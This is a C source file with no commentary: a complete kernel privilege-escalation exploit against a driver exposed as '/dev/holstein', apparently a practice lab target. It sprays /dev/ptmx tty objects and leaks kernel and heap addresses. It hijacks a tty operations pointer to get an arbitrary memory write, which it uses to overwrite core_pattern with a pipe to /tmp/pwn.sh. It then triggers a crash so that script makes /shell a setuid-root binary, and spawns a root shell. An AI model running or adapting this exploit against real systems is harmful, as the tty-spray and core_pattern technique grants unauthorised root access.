#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

int fd;
int tty[100];
int target = 0;

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

uintptr_t g_buf;

uintptr_t core		= 0xffffffff81eb0b20;
uintptr_t mov_prdx_ecx	= 0xffffffff814b27c2;

static void leak_offset_and_g_buf(void)
{
	uint8_t data[0x440];

	read(fd, data, 0x440);
	offset = *(uintptr_t *)&data[0x418] - 0xffffffff81c38880;
	printf("[+] offset %p\n", offset);

	g_buf = *(uintptr_t *)&data[0x438] - 0x438;
	printf("[+] g_buf %p\n", g_buf);
}

static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
{
	uint8_t data[0x420];
	size_t left = len;
	uint32_t tmp;

	read(fd, data, 0x420);
	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_prdx_ecx);
	*(uintptr_t *)&data[0x418] = g_buf;

	write(fd, data, 0x420);

	for (int i = 0; i < len; i += 4, left -= 4) {
		if (left >= 4) {
			tmp = *(uint32_t *)(buf + i);
		} else {
			tmp = 0;
			for (int i = 0; i < left; ++i)
				tmp |= (uint32_t)(*(uint8_t *)(buf + i))
				       << (3 - i) * 8;
		}

		if (target) {
			ioctl(target, tmp, ptr + i);
		} else {
			for (int j = 0; j < 100; ++j) {
				if (ioctl(tty[j], tmp, ptr + i) != -1) {
					target = tty[j];
					break;
				}
			}
		}
	}
}

int main(void)
{
	for (int i = 0; i < 50; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	for (int i = 50; i < 100; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	leak_offset_and_g_buf();

	uint8_t evil[] = "|/tmp/pwn.sh";
	aaw(OFFSET(core), evil, sizeof(evil));

	system("echo -e '"
	       "#!/bin/sh\n"
	       "chown root:root /shell\n"
	       "chmod 6777 /shell"
	       "'"
	       ">/tmp/pwn.sh");
	system("chmod +x /tmp/pwn.sh");
	system("/core");

	printf("[+] get r00t!\n");
	execve("/shell", (char *[]){ "/bin/sh", NULL }, NULL);

	close(fd);
	return EXIT_SUCCESS;
}
